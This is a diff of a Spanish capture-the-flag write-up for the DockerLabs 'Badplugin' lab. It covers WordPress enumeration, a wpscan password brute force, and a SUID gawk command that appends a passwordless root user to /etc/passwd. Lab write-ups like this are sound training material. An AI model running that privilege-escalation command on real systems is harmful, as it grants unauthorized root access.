@@ -4,7 +4,7 @@ summary: "Write-up del laboratorio Badplugin de DockerLabs"
 author: elcybercurioso
 date: 2026-02-03 12:54:23
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, wordpress, suid, gawk]
 media_subpath: "/assets/img/posts/dockerlabs_badplugin"
 image:
   path: main.webp
@@ -78,11 +78,11 @@ Vemos que en el recurso `/info.php` se está viendo la ejecución del comando `p
 
 ![Desktop View](/20260129131951.webp){: width="972" height="589" .shadow}
 
-Tambien encontramos que hay un `phpmyadmin` en el servidor, el cual se encarga de gestionar las bases de datos:
+Tambien encontramos que hay un `phpmyadmin` en el servidor, el cual se encarga de gestionar las bases de datos, pero no encontramos ninguna manera de saltarnos el panel de autenticación:
 
 ![Desktop View](/20260129132040.webp){: width="972" height="589" .shadow}
 
-Existe también el recurso `/wordpress`, pero vemos que nos redirige al host `escolares.dl`:
+Nos indica que el recurso `/wordpress` también existe, pero vemos que nos redirige al host `escolares.dl`:
 
 ![Desktop View](/20260129131556.webp){: width="972" height="589" .shadow}
 
@@ -100,7 +100,7 @@ Si ahora volvemos a recargar la página, veremos que ya nos carga correctamente:
 
 Para obtener más información relacionada con las páginas que están construidas con **WordPress**, la herramienta **wpscan** es muy útil, por lo que la ejecutaremos en modo agresivo, ya que es un entorno controlado.
 
-Dentro de toda la información que nos devuelve, vemos que encuentra que el usuario `admin` existe en el sistema:
+Pasado un rato, nos descubre que el usuario `admin` es válido:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
@@ -143,7 +143,7 @@ _______________________________________________________________
 [+] Elapsed time: 00:18:59
 ```
 
-Por ello, con la misma herramienta **wpscan** tratamos de obtener la contraseña del usuario `admin` por fuerza bruta, la cual obtenemos al momento:
+Emplearemos nuevamente la herramienta **wpscan**, pero ahora para tratar de obtener la contraseña del usuario `admin` por fuerza bruta, la cual obtenemos al momento: 
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
@@ -270,7 +270,7 @@ Encontramos en [GTFOBins](https://gtfobins.org/gtfobins/gawk/#file-write) que po
 
 ![Desktop View](/20260202194609.webp){: width="972" height="589" .shadow}
 
-La que emplearemos en este caso es la de escribir con permisos elevados, que en este caso será en el fichero `/etc/passwd`, agregando un nuevo usuario con permisos elevados, pero sin contraseña:
+La técnica que emplearemos en esta ocasión es la de escribir con permisos elevados en ficheros críticos, que será en el fichero `/etc/passwd`, y agregaremos un nuevo usuario privilegiado (el cual no tendrá contraseña asignada):
 
 ```bash
 www-data@eaa9d3c280bf:/tmp$ gawk 'BEGIN { print "root2::0:0::/root:/bin/bash" >> "/etc/passwd" }'
@@ -279,11 +279,11 @@ www-data@eaa9d3c280bf:/tmp$ gawk 'BEGIN { print "root2::0:0::/root:/bin/bash" >>
 Una vez ejecutado el comando, podremos ver que efectivamente hemos podido escribir en el fichero `/etc/passwd`:
 
 ```bash
-root@eaa9d3c280bf:/tmp# cat /etc/passwd | grep root2
+www-data@eaa9d3c280bf:/tmp# cat /etc/passwd | grep root2
 root2::0:0::/root:/bin/bash
 ```
 
-Si ahora tratamos de invocar una consola como el nuevo usuario privilegiado, veremos que obtenemos la consola elevada, y sin aportar credenciales:
+Si ahora nos conectamos como el nuevo usuario, veremos que obtenemos la consola privilegiada sin haber tenido que aportar credenciales:
 
 ```bash
 www-data@eaa9d3c280bf:/tmp$ su root2
